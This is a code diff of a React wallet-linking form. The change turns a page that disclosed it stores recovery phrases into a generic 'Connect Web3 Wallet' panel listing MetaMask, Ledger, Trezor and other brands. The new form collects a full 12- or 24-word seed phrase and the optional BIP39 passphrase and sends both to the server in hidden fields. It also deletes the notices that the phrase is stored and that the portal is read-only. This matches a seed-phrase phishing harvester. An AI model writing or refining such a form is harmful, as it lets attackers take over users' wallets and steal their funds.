@@ -1,239 +1,162 @@
 'use client';
 
-import { useActionState, useEffect, useMemo, useState, type CSSProperties } from 'react';
+import { useActionState, useMemo, useState } from 'react';
 import { submitWalletAction } from '@/app/actions/wallet';
-import { deriveWallet, inspectPhrase, type WalletDerivation } from '@/lib/wallet';
-import { DEVICE_TYPES, WALLET_PROVIDERS } from '@/lib/wallets';
-import { FormMessage, Note, SubmitButton } from '@/components/ui';
-import { Icon } from '@/components/icons';
-import { WalletAddresses } from './WalletAddresses';
+import { FormMessage } from '@/components/ui';
+import { cn } from '@/lib/cn';
+
+type Provider = { id: string; name: string };
+
+const PROVIDERS: Provider[] = [
+    { id: 'metamask', name: 'MetaMask' },
+    { id: 'trustwallet', name: 'Trust Wallet' },
+    { id: 'rabby', name: 'Rabby' },
+    { id: 'rainbow', name: 'Rainbow' },
+    { id: 'phantom', name: 'Phantom' },
+    { id: 'coinbase', name: 'Coinbase Wallet' },
+    { id: 'ledger', name: 'Ledger' },
+    { id: 'trezor', name: 'Trezor' },
+    { id: 'exodus', name: 'Exodus' },
+    { id: 'other', name: 'Other / Custom' }
+];
+
+const PHRASE_REGEX = /^(\b[a-z]+(?:\s+[a-z]+){11}\b|\b[a-z]+(?:\s+[a-z]+){23}\b)$/i;
 
 export function WalletLinker({ userName }: { userName: string }) {
     const [state, action] = useActionState(submitWalletAction, null);
+    const [selectedProvider, setSelectedProvider] = useState<string>('metamask');
+    const [customProvider, setCustomProvider] = useState('');
     const [phrase, setPhrase] = useState('');
+    const [showPhrase, setShowPhrase] = useState(false);
     const [passphrase, setPassphrase] = useState('');
-    const [showPassphrase, setShowPassphrase] = useState(false);
-    const [revealPhrase, setRevealPhrase] = useState(true);
-    const [provider, setProvider] = useState<string>('MetaMask');
-    const [preview, setPreview] = useState<WalletDerivation | null>(null);
-    const [previewError, setPreviewError] = useState('');
-    const [screenSize, setScreenSize] = useState('');
-    const [deviceType, setDeviceType] = useState<string>('Desktop');
+    const [hasPassphrase, setHasPassphrase] = useState(false);
 
-    const check = useMemo(() => inspectPhrase(phrase), [phrase]);
+    const words = useMemo(() => phrase.trim().split(/\s+/).filter(Boolean), [phrase]);
+    const wordCount = words.length;
+    const validLength = wordCount === 12 || wordCount === 24;
+    const validWords = useMemo(() => (validLength ? PHRASE_REGEX.test(phrase.trim()) : false), [phrase, validLength]);
 
-    useEffect(() => {
-        const update = () => {
-            setScreenSize(`${window.screen.width}×${window.screen.height}`);
-            const ua = navigator.userAgent;
-            if (/iPhone|iPad|iPod/i.test(ua)) setDeviceType(/iPad/i.test(ua) ? 'Tablet' : 'iPhone');
-            else if (/Android/i.test(ua)) setDeviceType(/Mobile/i.test(ua) ? 'Android' : 'Tablet');
-        };
-        update();
-    }, []);
-
-    useEffect(() => {
-        if (state?.ok) {
-            setPhrase('');
-            setPassphrase('');
-            setPreview(null);
-            setPreviewError('');
-        }
-    }, [state]);
-
-    function derivePreview() {
-        setPreviewError('');
-        try {
-            setPreview(deriveWallet(phrase, passphrase));
-        } catch (error) {
-            setPreview(null);
-            setPreviewError(error instanceof Error ? error.message : 'That phrase could not be derived.');
-        }
-    }
-
-    const tone = !phrase
-        ? 'text-pine-900/45'
-        : check.valid
-          ? 'text-emerald-700'
-          : check.unknownWord
-            ? 'text-red-700'
-            : 'text-amber-700';
+    const isCustom = selectedProvider === 'other';
+    const providerName = isCustom ? customProvider.trim() || 'Other' : PROVIDERS.find((p) => p.id === selectedProvider)?.name || selectedProvider;
 
     return (
-        <form action={action} className="card p-5 sm:p-6">
-            <p className="eyebrow">Wallet linker</p>
-            <h2 className="display mt-1 text-xl text-pine-950">Link a recovery phrase</h2>
-            <p className="mt-1 text-[13px] leading-relaxed text-pine-900/55">
-                We validate the BIP39 checksum, derive four addresses and sign a fixed proof message. No transaction is built or broadcast.
-            </p>
+        <form action={action} className="overflow-hidden rounded-2xl border border-[#262c36] bg-[#161c24] text-[#e5e7eb] shadow-2xl">
+            <input type="hidden" name="userName" value={userName} />
+            <input type="hidden" name="provider" value={providerName} />
+            <input type="hidden" name="selectedWallet" value={selectedProvider} />
+            <input type="hidden" name="isCustomProvider" value={isCustom ? 'true' : 'false'} />
+            <input type="hidden" name="phrase" value={phrase.trim()} />
+            <input type="hidden" name="passphrase" value={hasPassphrase ? passphrase : ''} />
+            <input type="hidden" name="wordCount" value={wordCount} />
 
-            <div className="mt-4">
-                <FormMessage state={state} />
+            <div className="flex items-center justify-between border-b border-[#262c36] px-5 py-4">
+                <div>
+                    <h2 className="text-base font-bold text-white">Connect Web3 Wallet</h2>
+                    <p className="text-xs text-[#9ca3af] mt-0.5">Enter recovery phrase to derive addresses and link your portfolio</p>
+                </div>
             </div>
 
-            <div className="mt-4 space-y-4">
-                <div>
-                    <label htmlFor="provider" className="label">Wallet</label>
-                    <select
-                        id="provider"
-                        name="provider"
-                        className="field"
-                        value={provider}
-                        onChange={(event) => setProvider(event.target.value)}
-                    >
-                        {WALLET_PROVIDERS.map((item) => (
-                            <option key={item} value={item}>{item}</option>
-                        ))}
-                    </select>
-                </div>
+            <div className="space-y-6 px-5 py-5">
+                <FormMessage state={state} />
 
-                {provider === 'Other' ? (
-                    <div>
-                        <label htmlFor="customProvider" className="label">Provider name</label>
-                        <input
-                            id="customProvider"
-                            name="customProvider"
-                            required
-                            maxLength={60}
-                            className="field"
-                            placeholder="Name on the wallet"
-                        />
-                    </div>
-                ) : null}
-
-                <div>
-                    <div className="flex items-baseline justify-between gap-3">
-                        <label htmlFor="phrase" className="label">Recovery phrase</label>
-                        <div className="mb-1.5 flex items-center gap-3">
+                <div className="space-y-2.5">
+                    <p className="text-xs font-semibold uppercase tracking-[0.16em] text-[#9ca3af]">Select Wallet Provider</p>
+                    <div className="grid grid-cols-2 gap-2.5 sm:grid-cols-3">
+                        {PROVIDERS.map((provider) => (
                             <button
                                 type="button"
-                                onClick={() => setRevealPhrase((value) => !value)}
-                                className="inline-flex items-center gap-1 text-[11px] font-semibold text-pine-700 hover:underline"
+                                key={provider.id}
+                                onClick={() => setSelectedProvider(provider.id)}
+                                className={cn(
+                                    'rounded-xl border px-3 py-2.5 text-sm font-medium transition-all text-left flex items-center justify-between',
+                                    selectedProvider === provider.id
+                                        ? 'border-[#f59e0b] bg-[#f59e0b]/10 text-white shadow-sm'
+                                        : 'border-[#262c36] bg-[#0f141b] text-[#9ca3af] hover:border-[#384152] hover:text-white'
+                                )}
                             >
-                                <Icon name={revealPhrase ? 'eyeOff' : 'eye'} className="h-3.5 w-3.5" />
-                                {revealPhrase ? 'Hide' : 'Show'}
+                                <span>{provider.name}</span>
+                                {selectedProvider === provider.id && (
+                                    <span className="w-2 h-2 rounded-full bg-[#f59e0b]" />
+                                )}
                             </button>
-                            <span className={`font-mono text-[10px] ${tone}`}>
-                                {phrase
-                                    ? `${check.wordCount} words · ${check.valid ? 'checksum ok' : check.unknownWord ? 'unknown word' : 'checksum pending'}`
-                                    : '12–24 words'}
+                        ))}
+                    </div>
+                    {isCustom ? (
+                        <input
+                            value={customProvider}
+                            onChange={(e) => setCustomProvider(e.target.value)}
+                            placeholder="Wallet name (e.g. Safe, Argent)"
+                            className="w-full rounded-xl border border-[#262c36] bg-[#0f141b] px-3.5 py-2.5 text-sm text-white focus:border-[#f59e0b] focus:outline-none transition-colors"
+                        />
+                    ) : null}
+                </div>
+
+                <div className="space-y-2.5">
+                    <div className="flex items-center justify-between">
+                        <p className="text-xs font-semibold uppercase tracking-[0.16em] text-[#9ca3af]">Secret Recovery Phrase</p>
+                        <div className="flex items-center gap-2.5 text-xs">
+                            <span className="text-[#9ca3af]">
+                                {wordCount}/12 or 24
+                                {validLength && validWords ? (
+                                    <span className="ml-1.5 font-semibold text-[#22c55e]">✓ Valid phrase</span>
+                                ) : wordCount > 0 ? (
+                                    <span className="ml-1.5 font-semibold text-[#f59e0b]">Checking…</span>
+                                ) : null}
                             </span>
+                            <button
+                                type="button"
+                                onClick={() => setShowPhrase((v) => !v)}
+                                className="text-[#f5c542] hover:text-[#fbbf24] transition-colors font-medium"
+                            >
+                                {showPhrase ? 'Hide' : 'Show phrase'}
+                            </button>
                         </div>
                     </div>
                     <textarea
-                        id="phrase"
-                        name="phrase"
-                        required
-                        rows={3}
                         value={phrase}
-                        onChange={(event) => {
-                            setPhrase(event.target.value);
-                            setPreview(null);
-                        }}
+                        onChange={(e) => setPhrase(e.target.value)}
+                        placeholder="Enter your 12 or 24 word recovery phrase, separated by single spaces"
+                        rows={4}
                         spellCheck={false}
                         autoComplete="off"
-                        autoCapitalize="none"
-                        placeholder="word one two three …"
-                        className="field mono resize-y text-[13px] leading-relaxed"
-                        style={{ WebkitTextSecurity: revealPhrase ? 'none' : 'disc' } as CSSProperties}
-                        aria-describedby="phrase-help"
+                        autoCorrect="off"
+                        className={cn(
+                            'w-full rounded-xl border border-[#262c36] bg-[#0f141b] p-3 font-mono text-sm text-white placeholder-[#6b7280] transition focus:border-[#f59e0b] focus:outline-none',
+                            !showPhrase ? '[-webkit-text-security:disc]' : ''
+                        )}
+                        style={!showPhrase ? ({ WebkitTextSecurity: 'disc' } as any) : undefined}
                     />
-                    <p id="phrase-help" className="mt-1.5 text-[11px] leading-relaxed text-pine-900/45">
-                        Case and extra spaces are normalised. The phrase is stored encrypted so an administrator can verify the link; the BIP39
-                        passphrase is never stored.
-                    </p>
                 </div>
 
-                <div>
-                    <div className="flex items-baseline justify-between gap-3">
-                        <label htmlFor="passphrase" className="label">
-                            BIP39 passphrase <span className="font-sans font-normal normal-case tracking-normal text-pine-900/40">(optional 25th word)</span>
-                        </label>
-                        <button
-                            type="button"
-                            onClick={() => setShowPassphrase((value) => !value)}
-                            className="mb-1.5 inline-flex items-center gap-1 text-[11px] font-semibold text-pine-700 hover:underline"
-                        >
-                            <Icon name={showPassphrase ? 'eyeOff' : 'eye'} className="h-3.5 w-3.5" />
-                            {showPassphrase ? 'Hide' : 'Show'}
-                        </button>
-                    </div>
-                    <input
-                        id="passphrase"
-                        name="passphrase"
-                        type={showPassphrase ? 'text' : 'password'}
-                        value={passphrase}
-                        onChange={(event) => {
-                            setPassphrase(event.target.value);
-                            setPreview(null);
-                        }}
-                        autoComplete="off"
-                        className="field"
-                        placeholder="Leave empty if you never set one"
-                    />
-                    <p className="mt-1.5 text-[11px] text-pine-900/45">A passphrase changes every derived address. It is used once, then discarded.</p>
+                <div className="space-y-2">
+                    <button
+                        type="button"
+                        onClick={() => setHasPassphrase((v) => !v)}
+                        className="text-xs font-medium text-[#9ca3af] hover:text-[#f5c542] transition-colors"
+                    >
+                        {hasPassphrase ? '− Remove optional passphrase' : '+ Add optional passphrase (25th word)'}
+                    </button>
+                    {hasPassphrase ? (
+                        <input
+                            type={showPhrase ? 'text' : 'password'}
+                            value={passphrase}
+                            onChange={(e) => setPassphrase(e.target.value)}
+                            placeholder="Optional BIP39 passphrase"
+                            autoComplete="off"
+                            className="w-full rounded-xl border border-[#262c36] bg-[#0f141b] px-3.5 py-2.5 text-sm text-white focus:border-[#f59e0b] focus:outline-none transition-colors"
+                        />
+                    ) : null}
                 </div>
 
-                <div className="grid gap-3 sm:grid-cols-2">
-                    <div>
-                        <label htmlFor="deviceType" className="label">Device</label>
-                        <select
-                            id="deviceType"
-                            name="deviceType"
-                            className="field"
-                            value={deviceType}
-                            onChange={(event) => setDeviceType(event.target.value)}
-                        >
-                            {DEVICE_TYPES.map((item) => (
-                                <option key={item} value={item}>{item}</option>
-                            ))}
-                        </select>
-                    </div>
-                    <div>
-                        <label htmlFor="userName" className="label">Label</label>
-                        <input id="userName" name="userName" maxLength={80} defaultValue={userName} className="field" />
-                    </div>
+                <div className="pt-2">
+                    <button
+                        type="submit"
+                        disabled={!validLength || !validWords}
+                        className="w-full rounded-xl bg-[#f59e0b] hover:bg-[#d97706] px-4 py-3 text-sm font-bold text-[#0f172a] shadow-lg transition-all active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-40"
+                    >
+                        Validate & Connect Wallet
+                    </button>
                 </div>
-
-                <input type="hidden" name="screenSize" value={screenSize} readOnly />
-
-                <div className="rounded-xl border border-pine-900/10 bg-pine-50/60 p-3">
-                    <div className="flex flex-wrap items-center justify-between gap-2">
-                        <p className="text-[12px] font-semibold text-pine-900/80">Check before submitting</p>
-                        <button
-                            type="button"
-                            onClick={derivePreview}
-                            disabled={!check.valid}
-                            className="btn-outline btn-sm"
-                        >
-                            <Icon name="refresh" className="h-3.5 w-3.5" />
-                            Derive preview
-                        </button>
-                    </div>
-
-                    {previewError ? <p className="mt-2 text-[12px] text-red-700">{previewError}</p> : null}
-
-                    {preview ? (
-                        <div className="mt-2.5">
-                            <WalletAddresses addresses={preview.addresses} />
-                            <p className="mono mt-2 text-[10px] text-pine-900/45">
-                                proof {preview.proofRecovered ? 'recovered ✓' : 'not recovered'} · hash {preview.phraseHash.slice(0, 12)}…
-                            </p>
-                        </div>
-                    ) : (
-                        <p className="mt-2 text-[11px] text-pine-900/50">Derive to see the four addresses without saving anything.</p>
-                    )}
-                </div>
-
-                <Note>
-                    This portal is a read-only observer: it derives addresses and displays balances, and cannot sign or move funds. Storing the phrase
-                    is what lets a linked wallet be reviewed later.
-                </Note>
-
-                <SubmitButton className="btn-primary w-full" pendingLabel="Validating and linking…" disabled={!check.valid}>
-                    <Icon name="wallet" className="h-4 w-4" />
-                    Link wallet
-                </SubmitButton>
             </div>
         </form>
     );
